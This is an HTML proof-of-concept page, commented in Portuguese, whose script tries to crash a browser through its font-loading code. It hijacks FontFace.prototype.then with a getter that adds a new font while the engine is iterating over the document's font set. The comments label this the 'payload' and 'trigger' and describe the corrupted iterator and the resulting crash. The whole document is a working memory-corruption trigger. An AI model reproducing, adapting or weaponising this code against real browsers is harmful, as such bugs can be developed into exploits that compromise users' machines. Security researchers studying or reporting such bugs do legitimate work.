
<!DOCTYPE html>
<html>
<body>
<script>
// 1. Cria a face e a coloca no FontFaceSet (fica no estado "unloaded")
var face = new FontFace('CrashFam', 'local(Helvetica)');
document.fonts.add(face);
void face.loaded; // Arma a armadilha para resolver a promise

var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
var fired = false;

// 2. Instala o getter que sequestra a notificação de status
Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
        if (fired) return undefined;
        fired = true;
        
        // 3. O Payload: Muta o HashSet de fontes do documento.
        // Adicionar uma nova FontFace força o rehash da tabela hash interna
        // enquanto o C++ ainda está iterando sobre ela.
        document.fonts.add(new FontFace('Unrelated_' + Date.now(), 'local("x")'));
        
        return undefined;
    }
});

// 4. O GATILHO: Força o carregamento e a resolução síncrona.
// O C++ pausa, roda o getter, a tabela hash é realocada, 
// e o C++ retoma com o iterador corrompido -> CRASH.
ctx.font = '10px CrashFam';
ctx.measureText('a');
</script>
</body>
</html>
